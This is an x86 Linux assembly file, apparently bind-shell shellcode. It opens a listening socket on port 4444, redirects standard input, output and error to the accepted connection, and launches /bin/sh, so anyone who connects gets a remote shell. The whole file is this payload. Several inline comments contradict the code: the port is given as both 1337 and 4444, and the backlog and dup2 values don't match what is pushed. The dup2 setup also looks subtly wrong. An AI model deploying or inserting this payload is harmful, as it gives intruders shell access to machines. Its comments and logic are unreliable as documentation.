global _start
section .text
_start:
	; clear registers
	xor esi, esi
	mov ecx, esi
	mul ecx
	mov ebx, ecx
	
	; create socket 
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
	mov al, 0x66 	; SYS_SOCKETCALL (0x66)
	inc bl		; SYS_SOCKET (0x1) 
	push esi 	; IPPROTO_IP (0x0)
	push ebx 	; SOCK_STREAM (0x1)
	push 0x2 	; AF_INET (0x2)
	mov ecx, esp 	; set struct pointer to sock args
	int 0x80 
	mov edx, eax 	; EDX --> SOCKFD (0x3)

	; Create BIND Socket 
	; bind(sockfd, [AF_INET, 1337, INADDR_ANY], 16)
	mov al, 0x66	    ; SYS_SOCKETCALL
	inc bl		    ; ebx becomes 0x2
	push esi	    ; inaddr_any 0.0.0.0
	push word 0x5c11    ; sin_ port=4444
	push word 0x2 	    ; AF_INET (0x2)        
	mov ecx, esp
	
	push 0x10     	    ; (addrlen)
        push ecx            ; pointer to sockaddr	
	push edx            ; int sockfd (0x3)
        mov ecx, esp 	    ; set stuct pointer to sock args
        int 0x80
        	
	; Set BIND Socket to LISTEN
	; listen(int sockfd, int backlog)
	mov al, 0x66 	    ; SYS_SOCKETCALL
	add bl, 0x2	    ; SYS_LISTEN (0x4)
	push 0x1	    ; backlog queue size unlimited (0x0)
	push edx   	    ; int sockfd (0x3)
	mov ecx, esp 
	int 0x80 

	; Set BIND Socket to Accept
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	mov al, 0x66	    ; SYS_SOCKETCALL
	inc bl		    ; SYS_ACCEPT (0x5)
	push esi	    ; accept(sockaddr)
	push esi	    ; accept(addrlen)
	push edx	    ; int sockfd (0x3)
	mov ecx, esp
	int 0x80
	mov edx, eax
	mov ecx, 0x2
dup2:
	mov al, 0x3f  	    ; sys_dup2(0x3)
  	int 0x80
        dec ecx 
        jns dup2  

	; exevcve("/bin/sh", NULL, NULL)
    	mov eax, 0x0b       ; execve syscall
    	push esi            ; null byte
    	push 0x68732f2f     ; "//sh"
    	push 0x6e69622f     ; "/bin"
   	mov ebx, esp        ; ptr to "/bin//sh" string
   	mov ecx, esi        ; null ptr to argv
    	mov edx, 0x0        ; null ptr to envp
   	int 0x80        


